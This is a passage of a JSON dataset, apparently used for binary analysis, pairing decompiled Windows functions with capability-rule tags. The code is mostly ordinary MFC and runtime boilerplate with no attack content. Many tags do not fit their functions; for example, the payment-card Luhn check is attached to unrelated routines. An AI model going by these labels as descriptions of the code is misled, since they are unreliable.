        "decompiled_code": "\nuint32_t __cdecl\nfcn.00428b2e(uint arg_8h, uint *arg_ch, uint noname_2, code *arg_14h, uint *arg_18h, int32_t arg_1ch, uint *arg_20h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 1;\n    if (arg_20h != NULL) {\n        *arg_20h = arg_8h;\n        arg_20h[1] = arg_14h;\n        return 1;\n    }\n    if (0xb < arg_1ch - 0x35U) {\n        return 0;\n    }\n    // switch table (12 cases) at 0x428c14\n    switch(*((arg_1ch - 0x35U) * 4 + 0x428c14)) {\n    case 0x428b65:\n        (*arg_14h)();\n        break;\n    case 0x428b70:\n        uVar1 = (*arg_14h)();\n        break;\n    case 0x428b7b:\n        arg_18h = arg_ch;\n        goto code_r0x00428bf5;\n    case 0x428b80:\n        arg_18h = arg_ch;\n        goto code_r0x00428c00;\n    case 0x428b85:\n        (*arg_14h)(arg_18h[1], *arg_18h);\n        break;\n    case 0x428b95:\n        uVar1 = (*arg_14h)(arg_18h[1], *arg_18h);\n        break;\n    case 0x428ba5:\n        (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n        break;\n    case 0x428bb8:\n        uVar1 = (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n        break;\n    case 0x428bcb:\n        (*arg_14h)(arg_18h);\n        goto code_r0x00428be4;\n    case 0x428bd7:\n        (*arg_14h)(arg_18h, arg_ch);\ncode_r0x00428be4:\n        uVar1 = arg_18h[7] == 0;\n        arg_18h[7] = 0;\n        break;\n    case 0x428bf2:\ncode_r0x00428bf5:\n        (*arg_14h)(arg_18h);\n        break;\n    case 0x428bfd:\ncode_r0x00428c00:\n        uVar1 = (*arg_14h)(arg_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 604
    },
    "0042aed8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0042aed8(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.0042ae35(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*(iVar1 + 0x20) != 0) {\n        for (puVar2 = *(*(iVar1 + 0x20) + ((unaff_retaddr >> 4) % *(iVar1 + 0x24)) * 4); puVar2 != NULL;\n            puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 177
    },
    "0042da6d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042da6d(void)\n\n{\n    uint uVar1;\n    uint unaff_retaddr;\n    \n    uVar1 = fcn.00401460(0x104);\n    fcn.0041cc60(uVar1, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(uVar1, unaff_retaddr, 0x104);\n    (*_sym.imp.SHLWAPI.dll_PathStripToRootA)(uVar1);\n    fcn.00411955(0xffffffff);\n    return;\n}\n",
        "token_count": 127
    },
    "0042e045": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0042e045(int32_t *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    param_1[1] = param_3;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40);\n    *param_1 = iVar1;\n    if (iVar1 != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1);\n        fcn.0041c370(arg_8h, param_3 + 0x40, param_1[1]);\n        iVar1 = fcn.0042e02e(arg_8h);\n        param_1[2] = iVar1 == 0;\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*param_1);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 210
    },
    "0042e0ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042e0ad(int32_t param_1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    if (*(param_1 + 2) == -1) {\n        piVar2 = param_1 + 0x1a;\n    }\n    else {\n        piVar2 = param_1 + 0x12;\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 252
    },
    "0042e4ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0042e4ae(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.0042e424(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*(iVar1 + 0x20) != 0) {\n        for (puVar2 = *(*(iVar1 + 0x20) + ((unaff_retaddr >> 4) % *(iVar1 + 0x24)) * 4); puVar2 != NULL;\n            puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 178
    },
    "0042e508": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0042e508(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (0x10b < param_1) {\n        if (param_1 == 0x3e3) {\n            return 10;\n        }\n        if (param_1 == 0x3e4) {\n            return 10;\n        }\n        if (param_1 == 0x3e5) {\n            return 10;\n        }\n        if (param_1 == 999) {\n            return 5;\n        }\n        return 1;\n    }\n    if (param_1 == 0x10b) {\n        return 3;\n    }\n    if (param_1 < 0x3f) {\n        if (param_1 == 0x3e) {\n            return 8;\n        }\n        if (param_1 < 0x1a) {\n    // switch table (25 cases) at 0x42e6e6\n            switch(param_1) {\n            case 0:\n                return 0;\n            case 1:\n            case 7:\n            case 8:\n            case 9:\n            case 10:\n            case 0xd:\n            case 0xe:\n                goto code_r0x0042e603;\n            case 2:\n            case 6:\n            case 0x12:\n                goto code_r0x0042e603;\n            case 3:\n            case 0xf:\n            case 0x11:\n                goto code_r0x0042e603;\n            case 4:\n                return 4;\n            case 5:\n            case 0xc:\n            case 0x13:\ncode_r0x0042e603:\n                return 5;\n            case 0xb:\ncode_r0x0042e603:\n                return 6;\n            case 0x10:\n                return 7;\n            case 0x14:\n            case 0x15:\n            case 0x16:\n            case 0x17:\ncode_r0x0042e603:\n                return 10;\n            default:\n                goto code_r0x0042e603;\n            }\n        }\n        if (0x27 < param_1) {\n    // switch table (9 cases) at 0x42e74a\n            switch(param_1) {\n            case 0x34:\n            case 0x35:\n            case 0x37:\n                goto code_r0x0042e603;\n            case 0x36:\n            case 0x3a:\n                goto code_r0x0042e603;\n            default:\n                return 1;\n            case 0x39:\n            case 0x3b:\n                goto code_r0x0042e603;\n            case 0x3c:\n                goto code_r0x0042e603;\n            }\n        }\n        if (param_1 == 0x27) {\n            return 0xd;\n        }\n        if (0x20 < param_1) {\n            if (param_1 == 0x21) {\n                return 0xc;\n            }\n            if (param_1 == 0x22) {\n                return 3;\n            }\n            if (param_1 == 0x24) {\n                return 4;\n            }\n            if (param_1 == 0x26) {\n                return 0xe;\n            }\n            return 1;\n        }\n        if (param_1 == 0x20) {\n            return 0xb;\n        }\n        if (param_1 == 0x1a) {\n            return 6;\n        }\n        if (param_1 == 0x1b) {\n            return 9;\n        }\n        iVar1 = param_1 - 0x1d;\n        if (iVar1 == 0) {\n            return 5;\n        }\ncode_r0x0042e64f:\n        if (iVar1 == 1) {\ncode_r0x0042e603:\n            return 9;\n        }\n    }\n    else {\n        if (param_1 < 0x6c) {\n            if (param_1 == 0x6b) {\ncode_r0x0042e603:\n                return 2;\n            }\n            if (0x47 < param_1) {\n                if (param_1 == 0x50) {\n                    return 5;\n                }\n                if (param_1 == 0x52) {\n                    return 5;\n                }\n                if (param_1 == 0x55) {\n                    return 3;\n                }\n                if (param_1 != 0x56) {\n                    if (param_1 == 0x58) {\n                        return 10;\n                    }\n                    return 1;\n                }\n                return 5;\n            }\n            if (param_1 == 0x47) {\n                return 5;\n            }\n            if (param_1 == 0x40) {\n                return 5;\n            }\n            if (param_1 == 0x41) {\n                return 5;\n            }\n            if (param_1 == 0x42) {\n                return 6;\n            }\n            if (param_1 == 0x43) {\n                return 3;\n            }\n            iVar1 = param_1 - 0x44;\n            if (iVar1 == 0) {\n                return 4;\n            }\n        }\n        else {\n            if (param_1 < 0x91) {\n                if (param_1 == 0x90) {\n                    return 3;\n                }\n                if (param_1 < 0x76) {\n                    if (param_1 == 0x75) {\n                        return 10;\n                    }\n                    if (param_1 == 0x6c) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0x6f) {\n                        return 3;\n                    }\n                    if (param_1 == 0x70) {\n                        return 0xd;\n                    }\n                    if (param_1 == 0x71) {\n                        return 4;\n                    }\n                    if (param_1 != 0x72) {\n                        return 1;\n                    }\n                    return 6;\n                }\n                if (param_1 == 0x7b) {\n                    return 3;\n                }\n                if (param_1 == 0x7c) {\n                    return 3;\n                }\n                if (param_1 == 0x7d) {\n                    return 3;\n                }\n                iVar1 = param_1 - 0x83;\n                if (iVar1 == 0) {\n                    return 9;\n                }\n                goto code_r0x0042e64f;\n            }\n            if (param_1 < 0xb7) {\n                if (param_1 == 0xb6) {\n                    return 6;\n                }\n                if (param_1 == 0x91) {\n                    return 7;\n                }\n                if (param_1 == 0x9a) {\n                    return 3;\n                }\n                if (param_1 != 0xa1) {\n                    if (param_1 == 0xa7) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0xaa) {\n                        return 5;\n                    }\n                    return 1;\n                }\n                return 3;\n            }\n            if (param_1 == 0xb7) {\n                return 5;\n            }\n            if (param_1 == 0xbf) {\n                return 6;\n            }\n            if (param_1 == 0xc1) {\n                return 6;\n            }\n            iVar1 = param_1 - 0xce;\n            if (iVar1 == 0) {\n                return 3;\n            }\n        }\n        if (iVar1 == 2) {\ncode_r0x0042e603:\n            return 3;\n        }\n    }\ncode_r0x0042e603:\n    return 1;\n}\n",
        "token_count": 1737
    },
    "00430957": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00430957(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00431a51();\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(iVar1 + 0x2c);\n    return;\n}\n",
        "token_count": 57
    },
    "004315b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004315b9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x2c) = 0;\n    iVar1 = fcn.00431a41();\n    *(iVar1 + 0x34) = 0;\n    *(iVar1 + 0x54) = 0;\n    (*_sym.imp.USER32.dll_GetCursorPos)(iVar1 + 0x4c);\n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x38) = 0;\n    *(param_1 + 0x24) = 1;\n    return;\n}\n",
        "token_count": 200
    },
    "00431a77": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00431a77(void)\n\n{\n    fcn.00431a51();\n    fcn.00432999(0x4311cd);\n    return;\n}\n",
        "token_count": 39
    },
    "00432789": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432789(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_ECX;\n    uint lpCriticalSection;\n    \n    puVar1 = in_ECX + 7;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n    if ((arg_8h < 1) || (in_ECX[3] <= arg_8h)) goto code_r0x00432883;\n    iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*in_ECX);\n    if (iVar2 == 0) {\n        iVar2 = fcn.00432475(0x10);\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.004326db();\n        }\n        *(iVar2 + 8) = 0;\n        *(iVar2 + 0xc) = 0;\n        *(iVar2 + in_ECX[6]) = in_ECX[5];\n        in_ECX[5] = iVar2;\ncode_r0x00432804:\n        if (*(iVar2 + 0xc) == 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, in_ECX[3] << 2);\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LocalReAlloc)(*(iVar2 + 0xc), in_ECX[3] << 2, 2);\n        }\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n            iVar3 = fcn.00427582();\n        }\n        *(iVar2 + 0xc) = iVar3;\n        fcn.0041cc60(iVar3 + *(iVar2 + 8) * 4, 0, (in_ECX[3] - *(iVar2 + 8)) * 4);\n        *(iVar2 + 8) = in_ECX[3];\n        (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, iVar2);\n    }\n    else if ((*(iVar2 + 8) <= arg_8h) && (arg_ch != 0)) goto code_r0x00432804;\n    if ((*(iVar2 + 0xc) != 0) && (arg_8h < *(iVar2 + 8))) {\n        *(*(iVar2 + 0xc) + arg_8h * 4) = arg_ch;\n    }\ncode_r0x00432883:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n    return;\n}\n",
        "token_count": 602
    },
    "0043340b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0043340b(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.004332e2(param_1);\n    *param_1 = iVar1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00433390(unaff_retaddr);\n        *param_1 = iVar1;\n        iVar1 = (-(iVar1 != 0) & 0x7fffbffe) + 0x80004002;\n    }\n    else {\n        fcn.004333f0();\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 151
    },
    "00433647": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.00433647(int32_t param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    \n    uVar1 = *(param_1 + 0x28);\n    bVar2 = uVar1 < *(param_1 + 0x2c);\n    if (bVar2) {\n        fcn.0041c370(param_2, *(param_1 + 0x1c) * uVar1 + *(param_1 + 0x24), *(param_1 + 0x1c));\n        *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    }\n    return bVar2;\n}\n",
        "token_count": 166
    },
    "00433c82": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00433c82(uint8_t *param_1, uint16_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(param_2 * 4 + 0x43a438) + 4;\n    uVar1 = *param_1;\n    while (uVar1 != 0) {\n        if (uVar1 != 0xff) {\n            iVar3 = 0x43a490;\n            if ((uVar1 & 0x40) == 0) {\n                iVar3 = 0x43a4e8;\n            }\n            iVar2 = iVar2 + *(iVar3 + (uVar1 & 0xffffffbf) * 4);\n        }\n        param_1 = param_1 + 1;\n        uVar1 = *param_1;\n    }\n    return iVar2;\n}\n",
        "token_count": 206
    },
    "00434af4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00434af4(code *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint unaff_retaddr;\n    \n    *(param_2 + param_3) = unaff_retaddr;\n    *((param_2 + param_3) - param_3) = 0x434b04;\n    (*param_1)();\n    return;\n}\n",
        "token_count": 87
    },
    "00434bea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00434bea(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    char *arg_8h;\n    \n    iVar2 = fcn.00431a51();\n    fcn.00432c08(1);\n    arg_8h = iVar2 + 0x34;\n    while (*arg_8h != '\\0') {\n        puVar3 = fcn.0041c79b(arg_8h, 10);\n        *puVar3 = 0;\n        iVar4 = fcn.00431a51();\n        (*_sym.imp.USER32.dll_UnregisterClassA)(arg_8h, *(iVar4 + 8));\n        arg_8h = puVar3 + 1;\n    }\n    *(iVar2 + 0x34) = '\\0';\n    fcn.00432c6b(1);\n    iVar2 = fcn.00431a51();\n    if ((*(iVar2 + 4) != 0) && (pcVar1 = *(*(iVar2 + 4) + 0x38),  pcVar1 != NULL)) {\n        (*pcVar1)(1, 0);\n    }\n    iVar2 = fcn.00431a77();\n    if (*(iVar2 + 0x3c) != NULL) {\n        iVar4 = (**(**(iVar2 + 0x3c) + 0x138))();\n        if (iVar4 != 0) {\n            *(iVar2 + 0x3c) = 0;\n        }\n    }\n    iVar2 = fcn.00431a41();\n    iVar4 = fcn.00431a51();\n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    if (*(iVar4 + 0x14) == '\\0') {\n        if (*(iVar2 + 0x2c) != 0) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar2 + 0x2c));\n            *(iVar2 + 0x2c) = 0;\n        }\n        if (*(iVar2 + 0x28) != 0) {\n            (*pcVar1)(*(iVar2 + 0x28));\n            *(iVar2 + 0x28) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 521
    },
    "00404af0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nbool fcn.00404af0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    char16_t *pcStack16;\n    char *pcStack12;\n    \n    pcStack12 = \"CryptAcquireContextA\";\n    pcStack16 = L\"ADVAPI32.DLL\";\n    uStack20 = 0x404b02;\n    uStack20 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)();\n    uStack24 = 0x404b09;\n    pcVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack24 = 0;\n    uStack28 = 1;\n    uStack32 = 0;\n    uStack36 = 0;\n    pcStack16 = NULL;\n    iVar2 = (*pcVar1)(&stack0xfffffff0);\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*pcVar1)(&stack0xffffffdc, 0, 0, 1, 8);\n    return iVar2 != 0;\n}\n",
        "token_count": 262
    },
    "00410e70": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00410e70(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004108d0(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 162
    },
    "00414a61": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00414a61(uint *arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t arg_28h, int32_t arg_2ch, uint arg_30h)\n\n{\n    arg_8h[8] = (arg_10h & 0xffff) >> 0xe & 1;\n    arg_8h[5] = arg_30h;\n    arg_8h[9] = arg_20h;\n    *(arg_8h + 0xc) = arg_10h;\n    *arg_8h = arg_ch;\n    *(arg_8h + 0x32) = arg_18h;\n    arg_8h[1] = arg_24h;\n    *(arg_8h + 0x33) = arg_1ch;\n    arg_8h[7] = 1;\n    arg_8h[10] = arg_14h;\n    arg_8h[0xb] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    arg_8h[6] = 0;\n    if (arg_28h != 0) {\n        arg_8h[7] = 3;\n        arg_8h[2] = arg_28h;\n    }\n    if (arg_2ch != 0) {\n        arg_8h[7] = arg_8h[7] | 4;\n        arg_8h[3] = arg_2ch;\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "00414adc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00414adc(uint *param_1, uint param_2, uint param_3)\n\n{\n    param_1[8] = param_2;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[9] = param_3;\n    param_1[4] = 0;\n    return;\n}\n",
        "token_count": 131
    },
    "00414b05": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414b05(int32_t param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.ole32.dll_CoTaskMemFree;\n    (*_sym.imp.ole32.dll_CoTaskMemFree)(*(param_1 + 0x14));\n    *(param_1 + 0x14) = 0;\n    (*pcVar1)(*(param_1 + 0x18));\n    *(param_1 + 0x18) = 0;\n    fcn.00428fdc(*(param_1 + 8));\n    *(param_1 + 8) = 0;\n    fcn.00428fdc(*(param_1 + 0x10));\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0xc) = 0;\n    return;\n}\n",
        "token_count": 194
    },
    "00414b41": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00414b41(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t arg_28h, int32_t arg_2ch, uint arg_30h, uint arg_34h, uint arg_38h)\n\n{\n    arg_8h[8] = arg_34h;\n    arg_8h[5] = arg_30h;\n    arg_8h[9] = arg_20h;\n    *arg_8h = arg_ch;\n    *(arg_8h + 0xc) = arg_10h;\n    *(arg_8h + 0x32) = arg_18h;\n    *(arg_8h + 0x33) = arg_1ch;\n    arg_8h[0xb] = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    arg_8h[6] = 0;\n    arg_8h[10] = arg_14h;\n    arg_8h[7] = 0;\n    if (arg_38h == '\\0') {\n        arg_8h[7] = 1;\n        arg_8h[1] = arg_24h;\n    }\n    if (arg_28h != 0) {\n        arg_8h[7] = arg_8h[7] | 2;\n        arg_8h[2] = arg_28h;\n    }\n    if (arg_2ch != 0) {\n        arg_8h[7] = arg_8h[7] | 4;\n        arg_8h[3] = arg_2ch;\n    }\n    return;\n}\n",
        "token_count": 439
    },
    "00415d54": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00415d54(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CDataSourceControl.0;\n    param_1[1] = param_2;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    fcn.00427b60(10);\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = NULL;\n    param_1[0x12] = NULL;\n    param_1[0x13] = NULL;\n    param_1[0x14] = NULL;\n    param_1[0x15] = NULL;\n    param_1[0x16] = NULL;\n    return param_1;\n}\n",
        "token_count": 227
    },
    "00415ebf": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00415ebf(uint *param_1, uint param_2, uint param_3, ushort param_4)\n\n{\n    *param_1 = 0;\n    *(param_1 + 1) = param_4;\n    param_1[3] = 0;\n    param_1[5] = 0;\n    param_1[2] = param_3;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 107
    },
    "00427b60": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00427b60(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CPtrList.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 105
    },
    "00428058": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00428058(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CMapPtrToPtr.0;\n    if (param_2 < 1) {\n        param_2 = 0xa;\n    }\n    param_1[1] = NULL;\n    param_1[2] = 0x11;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 131
    },
    "0042873c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.0042873c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = *(param_1 + 4);\n    if ((iVar1 == 0x200) || (iVar1 == 0xa0)) {\n        iVar1 = fcn.00431a41();\n        iVar2 = fcn.00411a14(*(param_1 + 0x14), *(param_1 + 0x18));\n        if ((iVar2 == 0) || (*(param_1 + 4) != *(iVar1 + 0x54))) {\n            *(iVar1 + 0x4c) = *(param_1 + 0x14);\n            *(iVar1 + 0x50) = *(param_1 + 0x18);\n            *(iVar1 + 0x54) = *(param_1 + 4);\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        return uVar3;\n    }\n    if ((iVar1 != 0xf) && (iVar1 != 0x118)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 271
    },
    "00428b07": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428b07(int32_t param_1)\n\n{\n    *(param_1 + 4) = 1;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 1;\n    *(param_1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 108
    },
    "00428dbc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428dbc(code **param_1)\n\n{\n    *param_1 = vtable.CCmdUI.0;\n    param_1[8] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[9] = NULL;\n    param_1[4] = NULL;\n    param_1[3] = NULL;\n    param_1[5] = NULL;\n    param_1[7] = NULL;\n    param_1[6] = NULL;\n    return;\n}\n",
        "token_count": 125
    },
    "0042dd8c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
